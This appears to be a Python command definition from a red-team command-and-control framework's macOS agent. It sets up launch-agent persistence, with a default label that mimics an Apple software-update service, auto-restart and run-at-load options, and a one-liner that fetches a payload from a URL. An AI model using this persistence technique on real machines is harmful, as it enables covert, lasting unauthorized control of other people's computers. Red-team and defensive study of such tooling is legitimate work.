from CommandBase import *
import json


class PersistLaunchArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "args": CommandParameter(
                name="args",
                type=ParameterType.Array,
                description="List of arguments to execute in the ProgramArguments section of the PLIST",
            ),
            "KeepAlive": CommandParameter(
                name="KeepAlive",
                type=ParameterType.Boolean,
                default_value=True,
                description="Restart the persistence if it crashes for some reason",
            ),
            "label": CommandParameter(
                name="label",
                type=ParameterType.String,
                default_value="com.apple.softwareupdateagent",
                description="The label for the launch element",
            ),
            "LaunchPath": CommandParameter(
                name="LaunchPath",
                type=ParameterType.String,
                required=False,
                description="Path to save new plist to if LocalAgent is false",
            ),
            "LocalAgent": CommandParameter(
                name="LocalAgent",
                type=ParameterType.Boolean,
                default_value=True,
                description="Should be a local user launch agent?",
            ),
            "RunAtLoad": CommandParameter(
                name="RunAtLoad",
                type=ParameterType.Boolean,
                default_value=True,
                description="Should the launch element be executed at load",
            ),
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                raise ValueError("Missing JSON arguments")
        else:
            raise ValueError("Missing arguments")


class PersistLaunchCommand(CommandBase):
    cmd = "persist_launch"
    needs_admin = False
    help_cmd = "persist_launch"
    description = "Create a launch agent or daemon plist file and either automatically put it in ~/Library/LaunchAgents or if LocalAgent is false, save it to the specified location. If you want an elevated launch agent or launch daemon( /Library/LaunchAgents or /Library/LaunchDaemons), you either need to be in an elevated context already and specify the path or use something like shell_elevated to copy it there. If the first arg is 'apfell-jxa' then the agent will automatically construct a plist appropriate oneliner to use where arg1 should be the URL to reach out to for the payload."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = "@its_a_feature_"
    attackmapping = ["T1159", "T1160"]
    argument_class = PersistLaunchArguments

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass
